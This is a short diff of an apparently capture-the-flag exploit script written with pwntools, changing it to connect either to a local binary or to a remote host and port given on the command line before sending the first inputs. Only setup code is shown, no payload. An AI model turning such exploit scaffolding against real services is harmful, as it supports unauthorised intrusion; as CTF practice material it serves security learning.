@@ -10,10 +10,14 @@
 
 from pwn import *
 
-# context(os='linux', arch='amd64', log_level='debug')
+context(os='linux', arch='amd64', log_level='debug')
 
-Io = process("./run_circles")
-#Io = remote("pwn.sniperoj.cn", 30013)
+if len(sys.argv) == 3:
+    host = sys.argv[1]
+    port = int(sys.argv[2])
+    Io = remote(host, port)
+else:
+    Io = process("./pwn")
 
 Io.sendline("1024")
 Io.sendline("A")
